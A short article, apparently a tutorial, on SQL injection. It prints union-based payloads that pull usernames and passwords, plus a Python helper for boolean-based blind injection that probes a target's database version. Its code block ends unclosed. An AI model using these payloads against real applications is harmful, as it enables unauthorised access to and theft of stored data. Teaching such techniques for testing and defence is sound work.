# Advanced SQL Injection Techniques

SQL injection remains one of the most critical web application vulnerabilities. This research explores advanced techniques and modern bypass methods.

## Union-Based Injection

\`\`\`sql
-- Basic union injection
' UNION SELECT username, password FROM users--

-- Advanced payload with column count detection
' UNION SELECT 1,2,3,4,5,6,7,8,9,10--
\`\`\`

## Boolean-Based Blind Injection

```python
import requests

def blind_sqli_test(url, payload):
    response = requests.get(f"{url}?id=1' AND {payload}--")
    return "Welcome" in response.text

# Test for database version
payload = "SUBSTRING(@@version,1,1)='5'"
if blind_sqli_test(target_url, payload):
    print("MySQL version 5.x detected")
